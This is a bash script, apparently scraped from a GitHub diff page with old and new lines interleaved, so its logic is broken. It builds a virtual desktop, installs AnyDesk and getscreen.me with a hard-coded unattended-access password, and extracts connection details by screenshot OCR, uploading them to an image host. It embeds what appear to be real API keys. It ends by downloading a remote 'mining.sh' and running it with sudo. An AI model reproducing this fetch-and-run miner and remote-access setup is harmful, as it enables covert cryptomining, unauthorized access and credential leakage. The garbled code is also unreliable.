#!/bin/bashAdd commentMore actions
# --- Configuration ---
ANYDESK_DOWNLOAD_LINK="https://download.anydesk.com/linux/anydesk_7.0.0-1_amd64.deb"
IMGUR_API_KEY="f8f01de269e26920152bdea96ed4fdd4"
NINJA_API_KEY="YiWejAGWZ2h13WXnrN/JFw==LoeaMiLtXI0cRC16"
SCREENSHOT_PATH="/tmp/screenshot.png"
CROPPED_PATH="/tmp/screenshot_cropped.png"
XVFB_DISPLAY=":99"
RESOLUTION="1280x1024x24"

# --- Define your AnyDesk Unattended Access Password ---
# !!! IMPORTANT: Replace 'YOUR_STRONG_PASSWORD_HERE' with a very strong, unique password.
# !!! For production, consider fetching this from an environment variable or secure source.
ANYDESK_UNATTENDED_PASSWORD="MySuperSecureAnyDeskPassword123!"

# --- Install Dependencies ---
echo "[*] Installing core dependencies and updating system..."
echo "[*] Installing Dependencies..."
sudo apt update
sudo apt upgrade -y # Ensure all existing packages are up-to-date
# Add libpolkit-gobject-1-0 and other core dependencies
sudo apt install -y wget curl x11-utils openbox xvfb feh tint2 xfce4-terminal lxappearance pcmanfm libpolkit-gobject-1-0

# Install the specific AnyDesk dependencies explicitly (these were already listed in previous fixes)
echo "[*] Installing AnyDesk specific dependencies (if not already met by main install)..."
sudo apt install -y libgtk-3-0 libx11-xcb1 libxtst6 libxkbfile1 libgl1
sudo apt install -y wget curl x11-utils imagemagick openbox xvfb jq scrot feh tint2 xfce4-terminal lxappearance pcmanfm wmctrl

# Clean up apt cache
sudo apt clean
sudo apt autoremove -y

# --- Install Firefox ---
echo "[*] Installing Firefox..."
sudo add-apt-repository ppa:mozillateam/ppa -y
sudo apt update
sudo apt install --assume-yes firefox-esr dbus-x11 dbus
# --- Install Firefox ---   
add-apt-repository ppa:mozillateam/ppa -y  
apt update
apt install --assume-yes firefox-esr
apt install --assume-yes dbus-x11 dbus 

# --- Install AnyDesk ---
echo "[*] Installing AnyDesk..."
wget "$ANYDESK_DOWNLOAD_LINK" -O /tmp/anydesk.deb

# Attempt to install AnyDesk. apt should now find the dependencies as they were explicitly installed.
# If the above fails for some reason, apt --fix-broken install will be tried as a fallback.
sudo apt install -y /tmp/anydesk.deb || sudo apt --fix-broken install -y

# Reconfigure AnyDesk to fix any lingering issues after dependency installation
sudo dpkg --configure -a
# --- Install getscreen.me ---
echo "[*] Installing getscreen.me..."
wget https://getscreen.me/download/getscreen.me.deb -O /tmp/getscreen.me.deb
sudo dpkg -i /tmp/getscreen.me.deb
sudo apt --assume-yes --fix-broken install

# --- Start Virtual Display ---
echo "[*] Starting Xvfb..."
@@ -49,7 +32,7 @@ export DISPLAY=$XVFB_DISPLAY

# --- Start Openbox ---
echo "[*] Starting Openbox..."
openbox-session &
openbox-session &  
sleep 2

# --- Set wallpaper ---
@@ -70,58 +53,156 @@ xfce4-terminal &
echo "[*] Launching file explorer (PCManFM)..."
pcmanfm --no-desktop &

# --- Configure AnyDesk for Unattended Access and Retrieve ID with Retries ---
echo "[*] Attempting to set AnyDesk password and retrieve ID with retries..."
# --- Launch getscreen.me ---
echo "[*] Launching getscreen.me..."
/opt/getscreen.me/getscreen.me &
sleep 15

MAX_RETRIES=5
RETRY_COUNT=0
ANYDESK_ID=""
# --- Find and focus getscreen.me window ---
echo "[*] Finding getscreen.me window..."
WINDOW_ID=$(wmctrl -l | grep -i "getscreen" | awk '{print $1}' | head -1)

while [[ -z "$ANYDESK_ID" && "$RETRY_COUNT" -lt "$MAX_RETRIES" ]]; do
    RETRY_COUNT=$((RETRY_COUNT + 1))
    echo "Attempt $RETRY_COUNT of $MAX_RETRIES to configure AnyDesk and get ID..."
if [[ -z "$WINDOW_ID" ]]; then
    echo "[!] getscreen.me window not found. Trying alternative approach..."
    # Try to find by process name or class
    WINDOW_ID=$(xwininfo -root -tree | grep -i "getscreen" | grep -o "0x[0-9a-fA-F]*" | head -1)
fi

    echo "    Stopping AnyDesk service (if running)..."
    sudo systemctl stop anydesk.service 2>/dev/null || true # Suppress error if not running
if [[ -n "$WINDOW_ID" ]]; then
    echo "[*] Found getscreen.me window: $WINDOW_ID"
    
    # Activate and raise the window
    wmctrl -i -a "$WINDOW_ID"
    sleep 2
    
    # Get window geometry
    WINDOW_GEOMETRY=$(xwininfo -id "$WINDOW_ID" | grep -E "Absolute upper-left|Width|Height")
    X_POS=$(echo "$WINDOW_GEOMETRY" | grep "Absolute upper-left X" | awk '{print $4}')
    Y_POS=$(echo "$WINDOW_GEOMETRY" | grep "Absolute upper-left Y" | awk '{print $4}')
    WIDTH=$(echo "$WINDOW_GEOMETRY" | grep "Width" | awk '{print $2}')
    HEIGHT=$(echo "$WINDOW_GEOMETRY" | grep "Height" | awk '{print $2}')
    
    echo "[*] Window position: ${X_POS}x${Y_POS}, Size: ${WIDTH}x${HEIGHT}"
    
    # Capture screenshot of the specific window
    echo "[*] Capturing screenshot of getscreen.me window..."
    scrot -a "${X_POS},${Y_POS},${WIDTH},${HEIGHT}" "$SCREENSHOT_PATH"
else
    echo "[!] Could not find getscreen.me window. Taking full screenshot..."
    scrot "$SCREENSHOT_PATH"
fi

if [[ ! -f "$SCREENSHOT_PATH" ]]; then
    echo "[!] Screenshot capture failed."
    exit 1
fi

    echo "    Starting AnyDesk service..."
    sudo systemctl start anydesk.service
    sleep 5 # Give the service a moment to start fully
# --- Auto-detect and crop the connection info area ---
echo "[*] Processing screenshot for connection info..."

    echo "    Setting AnyDesk password for unattended access..."
    echo "$ANYDESK_UNATTENDED_PASSWORD" | sudo anydesk --set-password 2>/dev/null
# First, try to detect if there's text in the image and find the area with connection info
TEMP_OCR="/tmp/temp_ocr.json"
curl -s -X POST "https://api.api-ninjas.com/v1/imagetotext" \
    -H "X-Api-Key: $NINJA_API_KEY" \
    -F "image=@$SCREENSHOT_PATH" > "$TEMP_OCR"

    echo "    Retrieving AnyDesk ID..."
    ANYDESK_ID=$(anydesk --get-id)
    sleep 2 # Give it a moment after ID retrieval attempt
# Check if we can find connection info in the full screenshot
FULL_EXTRACTED_TEXT=$(cat "$TEMP_OCR" | jq -r '.[] | select(.text | test("getscreen\\.me|[0-9]{3}\\.[0-9]{3}\\.[0-9]{2}")) | .text')

    if [[ -z "$ANYDESK_ID" ]]; then
        echo "    AnyDesk ID not found. Retrying in 5 seconds..."
        sleep 5
    else
        echo "    AnyDesk ID retrieved successfully."
if [ -n "$FULL_EXTRACTED_TEXT" ]; then
    echo "[*] Connection info found in full screenshot"
    cp "$SCREENSHOT_PATH" "$CROPPED_PATH"
else
    # If not found, try cropping different areas where connection info might be displayed
    echo "[*] Trying to locate connection info area..."
    
    # Common areas where connection info appears (adjust based on getscreen.me UI)
    CROP_AREAS=(
        "400x200+50+50"      # Top-left area
        "500x300+100+100"    # Center-left area  
        "600x400+50+200"     # Lower area
        "400x150+200+50"     # Top-center area
    )
    
    FOUND_INFO=false
    for CROP in "${CROP_AREAS[@]}"; do
        echo "[*] Trying crop area: $CROP"
        convert "$SCREENSHOT_PATH" -crop "$CROP" "/tmp/test_crop.png"
        
        # Test OCR on this crop
        TEST_OCR=$(curl -s -X POST "https://api.api-ninjas.com/v1/imagetotext" \
            -H "X-Api-Key: $NINJA_API_KEY" \
            -F "image=@/tmp/test_crop.png")
        
        TEST_TEXT=$(echo "$TEST_OCR" | jq -r '.[] | select(.text | test("getscreen\\.me|[0-9]{3}\\.[0-9]{3}\\.[0-9]{2}")) | .text')
        
        if [ -n "$TEST_TEXT" ]; then
            echo "[*] Found connection info in crop area: $CROP"
            cp "/tmp/test_crop.png" "$CROPPED_PATH"
            FOUND_INFO=true
            break
        fi
    done
    
    if [ "$FOUND_INFO" = false ]; then
        echo "[*] Using default crop of full screenshot"
        # Default crop - adjust these values based on typical getscreen.me window layout
        convert "$SCREENSHOT_PATH" -crop 600x400+0+0 "$CROPPED_PATH"
    fi
done
fi

if [[ -n "$ANYDESK_ID" ]]; then
if [[ ! -f "$CROPPED_PATH" ]]; then
    echo "[!] Image processing failed."
    exit 1
fi

# --- Upload Screenshot (optional) ---
echo "[*] Uploading screenshot..."
UPLOAD_URL="https://api.imgbb.com/1/upload?key=$IMGUR_API_KEY"
RESPONSE=$(curl -s -X POST -F "image=@$CROPPED_PATH" "$UPLOAD_URL")
IMAGE_URL=$(echo "$RESPONSE" | jq -r '.data.url')

if [[ "$IMAGE_URL" == "null" || "$IMAGE_URL" == "" ]]; then
    echo "❌ Upload failed."
    echo "Response: $RESPONSE"
else
    echo "✅ Screenshot uploaded: $IMAGE_URL"
fi

# --- Extract connection info from processed image ---
echo "[*] Extracting connection information..."
OCR_RESPONSE=$(curl -s -X POST "https://api.api-ninjas.com/v1/imagetotext" \
    -H "X-Api-Key: $NINJA_API_KEY" \
    -F "image=@$CROPPED_PATH")

# Print the raw OCR response
echo "📋 Raw OCR Response:"
echo "$OCR_RESPONSE"

# --- Extract connection information ---
echo "[*] Looking for connection information:"

# Look for getscreen.me URLs
GETSCREEN_TEXT=$(echo "$OCR_RESPONSE" | jq -r '.[] | select(.text | test("getscreen\\.me")) | .text')

# Look for IP addresses or connection codes
CONNECTION_TEXT=$(echo "$OCR_RESPONSE" | jq -r '.[] | select(.text | test("[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}|[A-Z0-9]{6,}")) | .text')

if [ -n "$GETSCREEN_TEXT" ]; then
    clear
    echo "🔗 GetScreen.me Connection Link Found:"
    echo "$GETSCREEN_TEXT"
elif [ -n "$CONNECTION_TEXT" ]; then
    clear
    echo "✅ AnyDesk ID: $ANYDESK_ID"
    echo "Unattended Access Password: $ANYDESK_UNATTENDED_PASSWORD"
    echo "You can now connect to this AnyDesk ID using the provided password."
    echo "🔗 Connection Information Found:"
    echo "$CONNECTION_TEXT"
else
    echo "❌ Failed to retrieve AnyDesk ID after $MAX_RETRIES attempts."
    echo "Please check AnyDesk service status and logs for more information."
    sudo systemctl status anydesk.service
    journalctl -u anydesk.service --no-pager -n 50 # Show last 50 lines of service log
    echo "⚠️ No connection information found in the screenshot."
    echo "📋 All extracted text:"
    echo "$OCR_RESPONSE" | jq -r '.[].text'
fi

# --- Launch the mining script ---
# Clean up temporary files
rm -f /tmp/test_crop.png "$TEMP_OCR"
xfce4-terminal -e "bash -c 'sudo curl -o try.sh https://raw.githubusercontent.com/Working-aanas/deepscreen/refs/heads/main/mining.sh && sudo chmod +x try.sh && sudo ./try.sh; exec bash'" &

# --- Keep the session alive with periodic messages ---
echo "[*] Virtual desktop session and mining script are running. Sending heartbeat messages every 5 minutes."
while true; do
    echo "[*] Heartbeat: Session is still alive at $(date)."
    sleep 300 # Sleep for 5 minutes (300 seconds)
done
sleep 86400
